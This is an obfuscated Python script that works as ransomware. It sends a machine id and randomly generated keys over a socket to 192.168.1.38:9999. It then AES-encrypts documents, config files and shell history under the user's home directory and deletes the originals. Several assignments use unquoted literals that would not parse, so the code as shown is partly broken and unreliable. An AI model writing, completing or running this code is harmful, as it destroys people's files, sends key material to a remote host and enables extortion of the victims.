#!/usr/bin/env python3
import os
import platform
import hashlib
import string

def x(u):
 y=16-(len(u)%16)
 u+=bytes([y])*y
 return u

class V():

 def __init__(Q):  
  #b=ubuntu//Linux-4.4.0-142-generic-x86_64-with-Ubuntu-16.04-xenial:x86_64:Linux:test:/home/test
  #Q.id=hashlib.sha256(b.encode('utf8')).hexdigest()
  Q.id=6cd70595ac24b8bd8e7c13f84d7dca1865811835e57f0d34e679da2ea6d258bc
  Q.system=Linux
  Q.machine=x86_64
  Q.user=test
  Q.home=/home/test
  f=open('/tmp/.X11.'+Q.id,'w')
  f.write(Q.id)
  f.close()
  
 def r(Q,c,fl):
    import os
    try:
         f=open(fl,'rb')
         d=f.read()
         f.close()
         d=x(d)
         q=c.encrypt(d)
         f=open(fl+'.enc','wb')
         f.write(q)
         f.close()
         os.remove(fl)
    except:
        pass

 def t(Q):
  import socket
  import random
  import base64
  M=[]
  for x in range(16):
   p=''.join(random.choices(string.ascii_letters,k=16))
   M.append(p)
  u=','.join(k for k in M)
  u=bytes(u,"utf-8")
  u=base64.b64encode(u)
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('192.168.1.38',9999))
  s.sendall(bytes(Q.id,"utf-8"))
  s.recv(1)
  s.sendall(u)
  from Crypto.Cipher import AES
  c=AES.new(p,AES.MODE_ECB)
  for(dirpath,dirnames,filenames)in os.walk(Q.home):
   if '.ssh' not in dirnames:
    for fn in filenames:
     for e in ['.doc','.txt','.rc','.ini','.dat','.conf','_history']:
      if fn.endswith(e):
       Q.r(c,dirpath+'/'+fn)
       break

k=V()
k.t()
